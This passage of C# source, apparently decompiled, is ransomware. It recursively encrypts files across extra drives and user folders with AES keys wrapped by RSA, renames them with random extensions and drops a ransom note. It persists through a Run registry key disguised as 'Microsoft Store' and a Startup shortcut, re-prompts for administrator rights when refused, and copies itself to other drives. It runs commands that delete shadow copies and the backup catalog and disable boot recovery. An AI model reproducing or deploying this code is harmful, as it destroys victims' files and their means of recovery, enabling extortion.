						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
